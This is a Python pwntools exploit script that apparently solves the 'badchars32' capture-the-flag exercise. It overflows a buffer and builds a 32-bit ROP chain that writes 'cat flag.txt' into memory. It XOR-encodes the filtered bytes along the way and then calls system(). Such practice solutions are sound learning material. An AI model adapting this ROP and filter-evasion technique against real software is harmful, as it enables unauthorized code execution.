from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='i386')
# p = gdb.debug('./badchars32', 'b *0x080487a7')
p = process('./badchars32')

def write_that_there(that,there):
    there = p32(there)
    payload = b''
    payload += pop_esi_edi
    payload += that
    payload += there
    payload += mov_edi_esi
    return payload

def xor_that_there(that,there):
    that = p32(that)
    there = p32(there)
    payload = b''
    payload += pop_ebx
    payload += there
    payload += pop_ecx
    payload += that
    payload += xor_ebx_cl
    return payload

def xor_chars(string):
    to_xor = b''
    valid_string = b''
    for char in string:
        n = char
        for i in range(256):
            new_char = chr(n^i).encode()
            if new_char not in badchars:
                valid_string += new_char
                to_xor += chr(i).encode()
                break
    return (valid_string,to_xor)
    
badchars = b'bic/ fns'

padding = b'A'*44
system = p32(0x080484e0)
exit = p32(0x080484f0)
cmd = b'cat flag.txt'
data_int = 0x0804a038
mov_edi_esi = p32(0x8048893)
pop_esi_edi = p32(0x8048899)
xor_ebx_cl = p32(0x08048890)
pop_ebx = p32(0x08048461)
pop_ecx = p32(0x08048897)

payload = padding

for i in range(0,len(cmd),4):
    word,to_xor = xor_chars(cmd[i:i+4])
    payload += write_that_there(word,data_int+i)
    for j,c in enumerate(to_xor):
        if c != 0:
            payload += xor_that_there(c,data_int+i+j)

payload += system
payload += exit
payload += p32(data_int)

p.sendline(payload)
p.recvline()
p.recvline()
p.recvline()
print(p.recvall().decode())
